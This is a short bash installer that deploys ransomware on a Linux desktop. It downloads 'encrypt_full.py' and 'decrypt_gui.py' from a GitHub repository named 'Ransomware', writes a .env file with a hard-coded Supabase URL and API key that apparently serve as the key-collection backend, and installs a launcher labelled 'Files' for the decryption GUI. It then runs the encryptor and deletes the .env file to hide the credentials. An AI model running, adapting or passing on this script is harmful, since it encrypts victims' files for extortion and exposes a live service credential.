#!/bin/bash

cd ~/Desktop || exit

# Download Python files
wget https://raw.githubusercontent.com/Google-design/Ransomware/main/encrypt_full.py
wget https://raw.githubusercontent.com/Google-design/Ransomware/main/decrypt_gui.py

# Create the .env file
cat <<EOF > .env
SUPABASE_URL="https://qlvtkhpjazvwfnqzoqjr.supabase.co"
SUPABASE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFsdnRraHBqYXp2d2ZucXpvcWpyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc1NjI0OTgsImV4cCI6MjA3MzEzODQ5OH0.yl7fKMEOq-h-hfEmRmE5pWviuo18ZCAUMW5YpoIlyGw"
EOF

# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate

# Install dependencies inside the venv
pip install cryptography supabase python-dotenv

# Deactivate just to be safe
deactivate

# Create the .desktop launcher to run GUI script with venv activated
cat <<EOF > decrypt.desktop
[Desktop Entry]
Name=Files
Exec=/bin/bash -c "cd ~/Desktop && source venv/bin/activate && python3 decrypt_gui.py && deactivate"
Type=Application
Terminal=false
Icon=system-lock-screen
EOF

# Make the desktop file executable
chmod +x decrypt.desktop

# Run the main script using virtual environment
source venv/bin/activate
python3 encrypt_full.py
deactivate

# Remove sensitive env file
rm .env